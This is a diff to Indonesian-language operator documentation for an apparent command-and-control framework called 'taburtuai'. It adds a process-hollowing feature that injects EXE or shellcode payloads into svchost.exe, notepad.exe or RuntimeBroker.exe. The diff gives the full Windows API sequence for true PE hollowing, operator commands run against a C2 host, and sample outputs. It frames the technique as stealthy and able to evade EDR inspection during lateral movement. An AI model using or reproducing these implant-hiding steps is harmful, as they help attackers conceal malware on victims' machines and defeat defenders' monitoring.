@@ -298,7 +298,79 @@ taburtuai(c2.yourdomain.com:443) › inject ppid 2703886d \
 ## Process Hollowing
 
 Buat proses legitimate dalam keadaan suspended, hapus kode aslinya, ganti dengan
-shellcode kita, resume. Proses terlihat legitimate karena nama dan path-nya asli.
+payload kita, resume. Proses terlihat legitimate karena nama dan path-nya asli.
+
+### Auto-Deteksi: PE vs Shellcode
+
+Agent secara otomatis mendeteksi jenis payload dari 2 byte pertama:
+
+| Magic bytes | Format | Teknik yang dipakai |
+|-------------|--------|---------------------|
+| `4D 5A` (`MZ`) | Full PE/EXE | **True PE Hollowing** — NtUnmapViewOfSection + relokasi + PEB patch |
+| Byte lain | Raw shellcode | **Shellcode RIP-redirect** — VirtualAllocEx + SetThreadContext(RIP) |
+
+Kamu tidak perlu memilih — cukup berikan file yang benar.
+
+---
+
+### True PE Hollowing (payload = file EXE)
+
+Teknik yang paling stealth: agent menjalankan **EXE asli** di dalam proses host tanpa
+menulis ke disk. Langkah internal:
+
+1. Parse PE headers dari payload (ImageBase, SizeOfImage, EntryPoint, relokasi)
+2. `CreateProcess(svchost.exe, SUSPENDED)` — buat proses host
+3. `NtQueryInformationProcess` → baca `PebBaseAddress`
+4. `ReadProcessMemory(PEB+0x10)` → baca `ImageBaseAddress` proses host
+5. `NtUnmapViewOfSection` → hapus kode original proses host
+6. `VirtualAllocEx` @ preferred ImageBase (fallback: anywhere)
+7. Copy PE headers + sections ke staging buffer lokal
+8. Apply base relocations jika `allocBase ≠ imageBase` (patch semua pointer 64-bit)
+9. `WriteProcessMemory` → tulis staging buffer ke proses remote
+10. Patch `PEB.ImageBaseAddress` → remote proses tahu di mana dirinya berada
+11. `SetThreadContext(RIP = allocBase + EntryPointRVA)` → arahkan eksekusi
+12. `ResumeThread` → jalankan
+
+```
+taburtuai(c2.yourdomain.com:443) › hollow 2703886d \
+  --file "C:\Windows\Temp\agent.exe" \
+  --wait
+```
+
+**Output (payload = EXE, true PE hollow):**
+```
+[*] Process Hollowing...
+[*] Payload type: PE (MZ signature) → true PE hollowing
+[*] Spawning C:\Windows\System32\svchost.exe (suspended)
+    PID: 9872
+[*] NtQueryInformationProcess → PebBaseAddress: 0x000000003F200000
+[*] Remote ImageBase (from PEB+0x10): 0x00007FF800000000
+[*] NtUnmapViewOfSection → original image unmapped
+[*] VirtualAllocEx @ 0x0000000140000000 (preferred ImageBase)
+[*] Staging: copying headers + 5 sections (total 294,912 bytes)
+[*] Base relocations: delta=0x00000000, no patch needed
+[*] WriteProcessMemory → 294,912 bytes written
+[*] PEB.ImageBaseAddress patched → 0x0000000140000000
+[*] SetThreadContext(RIP = 0x000000014001A000)
+[*] ResumeThread...
+[+] PE hollow completed. EXE running inside svchost.exe (PID 9872).
+
+    Process Tree:
+    services.exe (PID 724)
+      └─► svchost.exe (PID 9872)  ← EXE kamu jalan di sini
+```
+
+**Kapan pakai True PE Hollow:**
+- Payload adalah full EXE (agent baru, lateral movement tool, dsb.)
+- Ingin proses terlihat seperti svchost/notepad dari semua sisi (memory, PEB, name)
+- EDR yang inspect process image base akan melihat nilai yang konsisten
+
+---
+
+### Shellcode Hollow (payload = .bin)
+
+Payload shellcode raw — tidak ada PE parsing, hanya VirtualAllocEx + RIP redirect.
+Lebih sederhana, cukup untuk shellcode standalone.
 
 ```
 taburtuai(c2.yourdomain.com:443) › hollow 2703886d \
@@ -306,30 +378,27 @@ taburtuai(c2.yourdomain.com:443) › hollow 2703886d \
   --wait
 ```
 
-**Output (target default: svchost.exe):**
+**Output (payload = shellcode):**
 ```
 [*] Process Hollowing...
+[*] Payload type: shellcode (no MZ) → RIP redirect
 [*] Spawning C:\Windows\System32\svchost.exe (suspended)
     PID: 9872
-[*] Unmapping original code (NtUnmapViewOfSection)...
-[*] Allocating shellcode memory at base address...
-[*] Writing shellcode (45,056 bytes)...
-[*] Patching entry point to shellcode address...
-[*] Resuming process...
-[+] Hollowing completed. Agent now running inside svchost.exe (PID 9872).
-
-    Process Tree:
-    services.exe (PID 724)
-      └─► svchost.exe (PID 9872)  ← shellcode jalan di sini
-                                     terlihat seperti svchost biasa
+[*] VirtualAllocEx: 0x000001F823C40000 (RWX, 45,056 bytes)
+[*] WriteProcessMemory: 45,056 bytes
+[*] SetThreadContext(RIP = 0x000001F823C40000)
+[*] ResumeThread...
+[+] Shellcode hollow completed. Running inside svchost.exe (PID 9872).
 ```
+
+---
 
 ### Hollow ke Target EXE Tertentu
 
 ```
-# Hollow ke notepad.exe
+# Hollow ke notepad.exe (EXE payload)
 hollow 2703886d \
-  --file "C:\Windows\Temp\payload.bin" \
+  --file "C:\Windows\Temp\agent.exe" \
   --exe notepad.exe \
   --wait
 ```
@@ -337,14 +406,15 @@ hollow 2703886d \
 **Output:**
 ```
 [*] Spawning C:\Windows\System32\notepad.exe (suspended)  PID: 10104
+[*] Payload type: PE → true PE hollowing
 [*] Hollowing and resuming...
-[+] Hollowing completed. Running inside notepad.exe (PID 10104).
+[+] PE hollow completed. Running inside notepad.exe (PID 10104).
 ```
 
 ```
 # Hollow ke RuntimeBroker.exe (trusted, selalu jalan di Windows 10+)
 hollow 2703886d \
-  --file "C:\Windows\Temp\payload.bin" \
+  --file "C:\Windows\Temp\agent.exe" \
   --exe RuntimeBroker.exe \
   --wait
 ```
